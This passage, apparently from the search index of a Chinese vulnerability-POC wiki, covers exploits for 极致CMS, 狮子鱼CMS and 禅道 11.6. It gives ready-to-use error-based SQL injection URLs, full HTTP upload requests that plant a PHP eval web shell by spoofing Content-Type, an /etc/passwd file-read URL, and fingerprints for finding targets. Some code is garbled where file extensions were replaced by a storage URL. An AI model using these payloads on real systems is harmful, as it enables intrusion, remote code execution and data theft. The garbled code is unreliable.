$this-\u003eStatement-\u003efetch(PDO::FETCH_ASSOC)){} $this-\u003eStatement=null; array_pop($rows); return $rows; } 跟进query执行函数 //执行SQL语句并检查是否错误 public function query($sql){ $this-\u003efilter[] = $sql; $this-\u003eStatement = $this-\u003epdo-\u003equery($sql); if ($this-\u003eStatement) { return $this; }else{ $msg = $this-\u003epdo-\u003eerrorInfo(); if($msg[2]) exit('数据库错误：' . $msg[2] . end($this-\u003efilter)); } } 看到$msg = $this-\u003epdo-\u003eerrorInfo();语句，也就是说会把数据库报错信息打印在页面上并显示出来并退出 一套分析下来没有发现对sql语句的过滤，如果得到的数据没有经过format_param过滤，会产生注入 例如: function exploit(){ M('member')-\u003efind(['username'=\u003e$_GET['name']]); } 如果直接这样GET POST REQUEST 带入数据库 会产生报错注入 例如 ./exploit/name=123’ (加一个引号会报错，如果引号没过滤) 现在只需要寻找类型是这样没过滤直接带入数据库的语句就行了 简单寻找下其实这样的地方挺多的，拿一个位置举例子 这里是一个支付插件的位置，蓝色方块1增加代码模拟开通支付宝功能通过验证 可以看到这个函数只使用[htmlspecialchars]来过滤了xss，sql语句没有过滤，用刚刚的方法来注入 可以看到的确出现了sql语句和数据库错误 直接报错注入获取敏感信息 mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" 官网url : https://www.jizhicms.cn/ \"\"\" def main(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 极致CMS 1.67 - 171 \\033[0m') print('+ \\033[36m使用格式: python3 CNVD-2020-4","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"极致CMS 后台文件编辑插件 任意文件上传 ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞描述 极致CMS后台中含有文件编辑插件，通过逻辑漏洞可任意修改文件 ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞影响 极致CMS ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"网络测绘 icon_hash=\"1657387632\" ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:3:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞复现 登陆后台查看插件处，有一个后台编辑的插件 安装之后设置密码并使用 如果已经设有密码，重新安装插件即可解决密码未知问题 修改为php代码 成功执行php代码的命令 ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:4:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"狮子鱼CMS ApiController.class.php SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apicontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apicontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apicontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apicontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 狮子鱼CMS ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apicontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apicontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"/seller.php?s=/Public/login\" ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apicontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apicontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录界面如下 存在漏洞的文件为 ApiController.class.php , 关键位置为 public function goods_detail() { $goods_id = I('get.goods_id'); //gallery =\u003eimg_url //goods goods.goods_desc goods_name group_price market_price sell_count group_number $sql=\"select g.*,gd.description,gd.summary,gd.tag from \". C('DB_PREFIX').\"goods g,\".C('DB_PREFIX').\"goods_description gd where g.goods_id=gd.goods_id and g.goods_id=\".$goods_id; $goods_arr=M()-\u003equery($sql); $qian=array(\"\\r\\n\"); $hou=array(\"\u003cbr/\u003e\"); $goods_arr[0]['summary'] = str_replace($qian,$hou,$goods_arr[0]['summary']); $sql=\"select image from \".C('DB_PREFIX').\"goods_image where goods_id=\".$goods_id; $goods_image=M()-\u003equery($sql); $gallery = array(); $default_image = ''; foreach($goods_image as $val) { $val['img_url'] = str_replace('http','https',C('SITE_URL')).'/Uploads/ http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/'.$val['image']; if(empty($default_image)) { $default_image = str_replace('http','https',C('SITE_URL')).resize($val['image'], C('goods_thumb_width'), C('goods_thumb_height')); } $gallery[] = array('img_url' =\u003e $val['img_url']); } $goods = $goods_arr[0]; 漏洞测试为 https://xxx.xxx.xx.xxx/index.php?s=api/goods_detail\u0026goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1) ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apicontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apicontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"狮子鱼CMS ApigoodController.class.php SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apigoodcontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apigoodcontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apigoodcontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apigoodcontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 狮子鱼CMS ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apigoodcontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apigoodcontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"/seller.php?s=/Public/login\" ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apigoodcontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apigoodcontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的文件为 ApigoodsController.class.php , 关键位置为 public function get_goods_detail() { $id = I('get.id'); $pin_id = I('get.pin_id', 0); $token = I('get.token'); $weprogram_token = M('weprogram_token')-\u003efield('member_id')-\u003ewhere( array('token' =\u003e$token) )-\u003efind(); $member_id = $weprogram_token['member_id']; $need_data = array(); $sql = \"select g.*,gd.description,gd.is_untake_level,level_discount,gd.video_src,gd.video_size_width,gd.vedio_size_height,gd.is_video, gd.summary,gd.share_title,gd.activity_summary,gd.tag from \" . C('DB_PREFIX') . \"goods g,\" . C('DB_PREFIX') . \"goods_description gd where g.goods_id=gd.goods_id and g.goods_id=\" . $id; $goods = M()-\u003equery($sql); $pin_model = D('Home/Pin'); $goods_model = D('Home/Goods'); $qian = array( \"/Uploads/image\" ); $c_site_url = str_replace('/dan','',C('SITE_URL')); $hou = array( $c_site_url . \"/Uploads/image\" ); $goods[0]['video_src'] = C('SITE_URL').\"Uploads/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/\".$goods[0]['video_src']; $goods[0]['description'] = str_replace($qian, $hou, $goods[0]['description']); $goods[0]['description'] = htmlspecialchars_decode($goods[0]['description']); $qian = array( \"\\r\\n\" ); 漏洞测试为 https://xxx.xxx.xx.xxx/index.php?s=apigoods/get_goods_detail\u0026id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1) ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apigoodcontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-apigoodcontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"狮子鱼CMS image_upload.php 任意文件上传 ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-image_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-image_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞描述 狮子鱼CMS使用CK编辑器，存在图片上传的绕过，造成 image_upload.php 任意文件上传 ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-image_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-image_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞影响 狮子鱼CMS ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-image_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-image_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"网络测绘 \"/seller.php?s=/Public/login\" ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-image_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:3:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-image_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞文件为 CK编辑器的 image_upload.php \u003c?php define ( 'IN_BAMBOO', true ); // 取得根目录 define ( 'ROOT_PATH', '../../../../' ); // back to your root path $arrType = array ( 'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jpg', 'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif', 'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/png', 'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/bmp', 'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/pjpeg', 'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jpeg' ); $max_size = 500 * 1024; // 最大文件限制（单位：byte） $upfile = ROOT_PATH.'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads'; // 图片目录路径 if (!isset($_FILES ['files'])){ echo '{\"result\":\"400\",\"msg\":\"未能找到图片，请确认图片是否过大\"}'; exit (); } $file = $_FILES ['files']; if ($_SERVER ['REQUEST_METHOD'] == 'POST') { // 判断提交方式是否为POST if (! is_uploaded_file ( $file ['tmp_name'] )) { // 判断上传文件是否存在 echo '{\"result\":\"400\",\"msg\":\"图片不存在\"}'; exit (); } if ($file ['size'] \u003e $max_size) { // 判断文件大小是否大于500000字节 echo '{\"result\":\"400\",\"msg\":\"上传图片太大，最大支持：'.($max_size/1024).'KB\"}'; exit (); } if (! in_array ( $file ['type'], $arrType )) { // 判断图片文件的格式 echo '{\"result\":\"400\",\"msg\":\"上传图片格式不对\"}'; exit (); } if (! file_exists ( $upfile )) { // 判断存放文件目录是否存在 mkdir ( $upfile, 0777, true ); } $imageSize = getimagesize ( $file ['tmp_name'] ); $img = $imageSize [0] . '*' . $imageSize [1]; $fname = $file ['name']; $ftype = explode ( '.', $fname ); $time = explode ( \" \", microtime () ); $time = $time [1] . ($time [0] * 1000); $time2 = explode ( \".\", $time ); $time = $time2 [0]; $returnName=$time.\".\" .end($ftype); $picName = $upfile . \"/\" . $returnName ; if (! move_uploaded_file ( $file ['tmp_name'], $picName )) { echo '{\"result\":\"400\",\"msg\":\"从:'.$file ['tmp_name'].'移动图片到:'.$picName.'出错\"}'; exit (); } else { echo '{\"result\":\"200\",\"imgurl\":\"http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/' . $returnName . '\"}'; } } ?\u003e 其中使用 Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif 即可绕过上传PHP文件 POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2 Host: Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs Content-Length: 208 ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"files\"; filename=\"test.php\" Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif \u003c?php @eval($_POST[test]);?\u003e ------WebKitFormBoundary8UaANmWAgM4BqBSs— 访问返回的文件路径 /Common/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/xxxxx.php ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-image_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:4:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-image_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"狮子鱼CMS wxapp.php 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-wxapp.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-wxapp.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 狮子鱼CMS wxapp.php文件 存在任意文件上传漏洞，攻击者在没有身份验证的情况下可以上传恶意文件 ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-wxapp.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-wxapp.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 狮子鱼CMS ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-wxapp.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-wxapp.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"/seller.php?s=/Public/login\" ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-wxapp.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-wxapp.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送请求包上传PHP文件 POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1 Host: Content-Length: 210 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"upfile\"; filename=\"test.php\" Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif \u003c?php @eval($_POST['test']);?\u003e ------WebKitFormBoundary8UaANmWAgM4BqBSs-- ","date":"0001-01-01","objectID":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-wxapp.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%8B%AE%E5%AD%90%E9%B1%BCcms-wxapp.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 禅道 11.6 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 这里造成漏洞的原因同样是调用接口权限无限制的原因 接口出现漏洞的原因具体参考可以查看上一篇 禅道 11.6版本 SQL注入漏洞 关于此漏洞的完整分析 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"第一种方法 查看module/file/moudel.php下的parseCSV方法 public function parseCSV($fileName) { $content = file_get_contents($fileName); /* Fix bug #890. */ $content = str_replace(\"\\x82\\x32\", \"\\x10\", $content); $lines = explode(\"\\n\", $content); $col = -1; $row = 0; $data = array(); foreach($lines as $line) { $line = trim($line); $markNum = substr_count($line, '\"') - substr_count($line, '\\\"'); if(substr($line, -1) != ',' and (($markNum % 2 == 1 and $col != -1) or ($markNum % 2 == 0 and substr($line, -2) != ',\"' and $col == -1))) $line .= ','; $line = str_replace(',\"\",', ',,', $line); $line = str_replace(',\"\",', ',,', $line); $line = preg_replace_callback('/(\\\"{2,})(\\,+)/U', array($this, 'removeInterference'), $line); $line = str_replace('\"\"', '\"', $line); /* if only one column then line is the data. */ if(strpos($line, ',') === false and $col == -1) { $data[$row][0] = trim($line, '\"'); } else { /* if col is not -1, then the data of column is not end. */ if($col != -1) { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] .= \"\\n\" . $line; $data[$row][$col] = str_replace('\u0026comma;', ',', $data[$row][$col]); continue; } else { $data[$row][$col] .= \"\\n\" . substr($line, 0, $pos); $data[$row][$col] = trim(str_replace('\u0026comma;', ',', $data[$row][$col])); $line = substr($line, $pos + 2); $col++; } } if($col == -1) $col = 0; /* explode cols with delimiter. */ while($line) { /* the cell has '\"', the delimiter is '\",'. */ if($line{0} == '\"') { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] = substr($line, 1); /* if line is not empty, then the data of cell is not end. */ if(strlen($line) \u003e= 1) continue 2; $line = ''; } else { $data[$row][$col] = substr($line, 1, $pos - 1); $line = substr($line, $pos + 2); } $data[$row][$col] = str_replace('\u0026comma;', ',', $data[$row][$col]); } else { /* the delimiter default is ','. */ $pos = strpos($line, ','); /* if line is not delimiter, then line is the data of cell. */ if($pos === false) { $data[$row][$col] = $line; $line = ''; } else { $data[$row][$col] = substr($line, 0, $pos); $line = substr($line, $pos + 1); } } $data[$row][$col] = trim(str_replace('\u0026comma;', ',', $data[$row][$col])); $col++; } } $row ++; $col = -1; } return $data; } 这里可以看到以file为模块名、parseCSV为方法名去调用读取文件 读取的文件名**$filename参数可控，例如读取/etc/passwd** http://xxx.xxx.xxx.xxx/api-getModel-file-parseCSV-fileName=/etc/passwd 注意以 .php .txt 结尾的会被 /framework/base/router.class.php中的parsePathInfo方法 过滤 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:1","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"第二种方法 查看module/api/moudel.php下的getMethod方法 public function getMethod($filePath, $ext = '') { $fileName = dirname($filePath); $className = basename(dirname(dirname($filePath))); if(!class_exists($className)) helper::import($fileName); $methodName = basename($filePath); $method = new ReflectionMethod($className . $ext, $methodName); $data = new stdClass(); $data-\u003estartLine = $method-\u003egetStartLine(); $data-\u003eendLine = $method-\u003egetEndLine(); $data-\u003ecomment = $method-\u003egetDocComment(); $data-\u003eparameters = $method-\u003egetParameters(); $data-\u003eclassName = $className; $data-\u003emethodName = $methodName; $data-\u003efileName = $fileName; $data-\u003epost = false; $file = file($fileName); for($i = $data-\u003estartLine - 1; $i \u003c= $data-\u003eendLine; $i++) { if(strpos($file[$i], 